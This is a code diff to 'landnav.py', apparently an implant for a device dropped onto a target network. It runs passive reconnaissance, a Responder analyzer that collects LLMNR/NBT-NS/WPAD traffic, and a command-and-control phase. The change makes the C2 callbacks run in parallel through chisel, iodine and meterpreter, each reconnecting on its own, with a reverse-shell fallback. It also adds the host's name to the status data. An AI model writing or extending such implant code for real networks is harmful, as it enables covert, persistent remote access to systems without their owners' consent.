@@ -20,7 +20,7 @@ Usage:
     python3 landnav.py --status         # Print current state and exit
 """
 
-VERSION = "0.12.2"
+VERSION = "0.14.0"
 
 import argparse
 import datetime
@@ -76,13 +76,15 @@ _start_time = datetime.datetime.now().isoformat()
 
 def _write_status():
     try:
+        import socket as _sock
         data = {
             "pid": os.getpid(),
             "version": VERSION,
+            "hostname": _sock.gethostname(),
             "started": _start_time,
-            "c2_state": egress._current_state,
-            "c2_method": egress._c2_method,
+            "c2_state": egress.get_aggregate_state(),
             "last_heartbeat": datetime.datetime.now().isoformat(),
+            "methods": egress.get_method_states(),
         }
         tmp = str(STATUS_FILE) + ".tmp"
         with open(tmp, "w") as f:
@@ -686,34 +688,30 @@ def stop_passive_recon():
 # ── Phase 4: C2 Egress ─────────────────────────────────────────
 
 def phase_c2_egress(net_config, cfg):
-    """Establish C2 callback.
+    """Start parallel C2 connections.
 
-    Returns: str method name on success, None on failure
+    Launches all enabled C2 methods in parallel (chisel, iodine,
+    meterpreter).  Each method auto-reconnects independently.
+    Reverse shell is attempted only after all methods stay failed
+    for 5 minutes.
+
+    Blocks until shutdown signal (SIGTERM/SIGINT).
     """
-    log.info("════════ Phase 4: C2 Egress Cascade ════════")
+    log.info("════════ Phase 4: C2 Parallel Egress ════════")
     led.set_state(led.C2_ATTEMPT)
 
     if net_config.proxy_host:
         cfg["_detected_proxy_host"] = net_config.proxy_host
         cfg["_detected_proxy_port"] = net_config.proxy_port
 
-    method = egress.run_cascade(cfg)
+    if _passive_collector:
+        log.info("Passive recon active: %d hosts, %d subnets observed",
+                 _passive_collector.get_host_count(),
+                 len(_passive_collector.get_targets()))
+    if _responder_analyzer and _responder_analyzer.is_running():
+        log.info("Responder analyzer active — LLMNR/NBT-NS/WPAD intelligence collecting")
 
-    if method:
-        log.info("════════ C2 ESTABLISHED via %s ════════", method)
-        led.set_state(led.C2_CONNECTED)
-
-        if _passive_collector:
-            log.info("Passive recon active: %d hosts, %d subnets observed",
-                     _passive_collector.get_host_count(),
-                     len(_passive_collector.get_targets()))
-        if _responder_analyzer and _responder_analyzer.is_running():
-            log.info("Responder analyzer active — LLMNR/NBT-NS/WPAD intelligence collecting")
-    else:
-        log.error("════════ C2 FAILED — all methods exhausted ════════")
-        led.set_state(led.ERROR)
-
-    return method
+    egress.run_parallel(cfg)
 
 # ── Auto-commands generation ────────────────────────────────────
 
@@ -925,8 +923,13 @@ def main():
 
     if args.status:
         print(f"LandNav v{VERSION}")
-        print(f"C2 State: {egress._current_state}")
-        print(f"C2 Method: {egress._c2_method or 'none'}")
+        print(f"C2 Aggregate: {egress.get_aggregate_state()}")
+        methods = egress.get_method_states()
+        if methods:
+            for name, info in methods.items():
+                print(f"  {name}: {info.get('state', 'unknown')}")
+        else:
+            print(f"  (no methods active)")
         if bridge.bridge_is_up():
             print(f"Bridge: UP ({bridge.BRIDGE_NAME})")
         if _passive_collector:
@@ -997,40 +1000,24 @@ def main():
         # ── Start passive recon (runs continuously) ─────────
         start_passive_recon(iface_info, cfg)
 
-        # ── Phase 4: C2 Egress ──────────────────────────────
-        retry_interval = cfg["c2"].get("retry_interval", 60)
-
-        while not _shutdown:
-            method = phase_c2_egress(net_config, cfg)
-
-            if method:
-                if egress._current_state == egress.EgressState.FAILED:
-                    log.warning("C2 session ended (%s) — re-entering cascade", method)
+        # ── Phase 4: C2 Egress (parallel — blocks until shutdown) ──
+        # Start LED updater to reflect aggregate C2 state
+        def _led_updater():
+            while not _shutdown:
+                agg = egress.get_aggregate_state()
+                if agg == egress.EgressState.CONNECTED:
+                    led.set_state(led.C2_CONNECTED)
+                elif agg == egress.EgressState.ATTEMPTING:
                     led.set_state(led.C2_ATTEMPT)
-                    continue
+                elif agg == egress.EgressState.FAILED:
+                    led.set_state(led.ERROR)
+                time.sleep(5)
 
-                log.info("C2 active via %s — starting watchdog", method)
-                egress.start_watchdog(cfg, on_reconnect=lambda m: led.set_state(led.C2_CONNECTED))
+        led_t = threading.Thread(target=_led_updater, daemon=True,
+                                 name="led-updater")
+        led_t.start()
 
-                while not _shutdown:
-                    time.sleep(5)
-                    if egress._current_state == egress.EgressState.FAILED:
-                        log.warning("C2 dropped (%s) — re-entering cascade", method)
-                        led.set_state(led.C2_ATTEMPT)
-                        break
-
-                egress.stop_watchdog()
-
-                if _shutdown:
-                    break
-            else:
-                log.info("Retrying C2 cascade in %ds", retry_interval)
-                led.set_state(led.ERROR)
-
-                for _ in range(retry_interval):
-                    if _shutdown:
-                        break
-                    time.sleep(1)
+        phase_c2_egress(net_config, cfg)
 
     except Exception as e:
         log.exception("Unhandled exception: %s", e)
